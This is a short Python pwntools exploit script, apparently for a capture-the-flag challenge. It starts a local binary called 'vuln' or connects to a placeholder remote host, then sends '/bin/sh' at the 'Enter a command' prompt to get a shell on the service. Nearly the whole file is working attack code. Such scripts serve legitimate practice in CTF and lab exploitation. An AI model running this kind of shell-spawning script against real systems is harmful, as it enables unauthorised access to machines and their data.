from pwn import *

exe = ELF("vuln")

context.binary = exe
context.log_level = 'DEBUG'

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("rua_host_goes_here", 1337)
    return r


io = start()
io.sendlineafter(b"Enter a command: \n",b"/bin/sh")
io.sendline("/bin/sh")
print(io.recv())
io.close()

